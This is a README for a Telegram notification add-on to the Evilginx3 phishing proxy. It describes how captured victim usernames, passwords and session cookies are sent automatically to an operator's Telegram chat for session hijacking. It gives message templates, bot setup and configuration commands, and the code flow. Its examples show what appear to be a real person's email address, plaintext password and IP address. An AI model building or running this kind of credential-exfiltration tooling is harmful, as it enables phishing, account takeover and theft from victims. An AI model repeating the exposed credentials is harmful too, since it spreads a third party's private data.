# Telegram Notifications Implementation

## Overview

Telegram notifications have been implemented in Evilginx3 to automatically send phishing capture notifications in a formatted manner. This feature sends two types of notifications for each successful phishing attack:

1. **Credentials Capture Notification** - Sent when username and password are captured
2. **Tokens Capture Notification** - Sent when authentication tokens/cookies are captured, along with the cookie file

## Notification Formats

### 1. Credentials Capture

When credentials (username and password) are captured, a notification is sent in this format:

```
{phishlet_name} capture

📧 Username: {escaped_username}

🔑 Password: {escaped_password}

🌐 IP: {ip_address}

📱 User-Agent: {escaped_user_agent}

🌐 Domain: {domain}

⏰ Time: {timestamp}
```

**Example:**
```
office capture

📧 Username: warren\.gordon@amrgroup\.co\.uk

🔑 Password: AMRhomenorth999

🌐 IP: 50.235.249.94

📱 User-Agent: Mozilla/5\.0 \(Windows NT 10\.0; Win64; x64\) AppleWebKit/537\.36 \(KHTML, like Gecko\) Chrome/142\.0\.0\.0 Safari/537\.36

🌐 Domain: www.office.com

⏰ Time: 2025-11-07 17:07:32 EST
```

### 2. Tokens/Cookies Capture

When authentication tokens and cookies are captured, a notification is sent followed by the cookie file:

```
{phishlet_name} capture

📊 Status: Tokens Captured

🍪 Cookies: {cookie_count}

📧 Username: {escaped_username}

🔑 Password: {escaped_password}

🌐 IP: {ip_address}

🌐 Domain: {domain}

📎 cookies attached
```

**Example:**
```
office capture

📊 Status: Tokens Captured

🍪 Cookies: 2

📧 Username: warren\.gordon@amrgroup\.co\.uk

🔑 Password: AMRhomenorth999

🌐 IP: 50.235.249.94

🌐 Domain: www.office.com

📎 cookies attached
```

The cookie file is sent as a document attachment immediately after this notification.

## Configuration

### Setting up Telegram Bot

1. **Create a Telegram Bot:**
   - Message [@BotFather](https://t.me/BotFather) on Telegram
   - Send `/newbot` and follow the instructions
   - Save the bot token provided

2. **Get Your Chat ID:**
   - Message your bot
   - Visit: `https://api.telegram.org/bot{YOUR_BOT_TOKEN}/getUpdates`
   - Find your chat ID in the response

3. **Configure Evilginx3:**
   ```
   config telegram bot_token <your_bot_token>
   config telegram chat_id <your_chat_id>
   config telegram enabled true
   ```

4. **Test Configuration:**
   ```
   config telegram test
   ```

### Configuration Commands

- `config telegram bot_token <token>` - Set the Telegram bot token
- `config telegram chat_id <chat_id>` - Set the chat ID for notifications
- `config telegram enabled <true|false>` - Enable or disable Telegram notifications
- `config telegram test` - Send a test message to verify configuration

## Technical Details

### Modified Files

1. **core/telegram.go**
   - Updated `SendCredentials()` to use the new format with phishlet name
   - Added `SendTokensCapture()` for tokens/cookies notifications
   - Added `escapeMarkdownV2()` function for proper Telegram MarkdownV2 escaping
   - Updated to use MarkdownV2 parse mode for all messages
   - Updated `SendTestMessage()` and `SendSessionFile()` to match new format

2. **core/telegram_exporter.go**
   - Modified `AutoExportAndSendSession()` to send tokens capture notification
   - Added cookie count calculation
   - Sends notification message before the cookie file
   - Added 500ms delay to ensure message arrives before file

3. **core/http_proxy.go**
   - Updated `setSessionUsername()` to pass phishlet name to `SendCredentials()`
   - Updated `setSessionPassword()` to pass phishlet name to `SendCredentials()`

### Notification Flow

1. **Credentials Capture:**
   - User enters credentials on phishing page
   - `setSessionUsername()` or `setSessionPassword()` is called
   - When both username and password are available, `SendCredentials()` is called
   - Telegram notification is sent with credentials

2. **Tokens Capture:**
   - Authentication cookies/tokens are intercepted
   - When all required tokens are captured, `AutoExportAndSendSession()` is called
   - Session is exported to JSON file
   - `SendTokensCapture()` sends the notification message
   - Cookie file is sent as document attachment (500ms delay to ensure proper order)
   - Session is marked as exported to prevent duplicates

### Security Features

- All special characters in text are escaped using MarkdownV2 format
- Duplicate notifications are prevented by tracking exported sessions
- Messages are queued to prevent blocking
- Failed notifications are logged but don't interrupt phishing operations

### Phishlet Support

The notifications work with all phishlets:
- Office 365 (o365)
- Facebook
- Custom phishlets

The phishlet name is automatically included in each notification (e.g., "office capture", "facebook capture").

## Error Handling

- Queue overflow: Messages are dropped if queue is full, logged as warning
- Telegram API errors: Logged but don't stop phishing operations
- Export failures: Logged as errors
- Network issues: Handled gracefully with timeouts

## Notes

- Notifications use Telegram's MarkdownV2 format for proper formatting
- Cookie files are automatically cleaned up after sending
- Session export includes all captured data (credentials, cookies, tokens)
- The implementation supports multiple concurrent sessions
- Notifications are sent asynchronously to avoid blocking the proxy

## Example Output

When a victim logs into an Office 365 phishing page, you'll receive:

1. First notification with credentials (username and password)
2. Second notification with token status and cookie count
3. Cookie file attachment containing the complete session data

This allows you to immediately see captured credentials and have all authentication cookies ready for session hijacking.

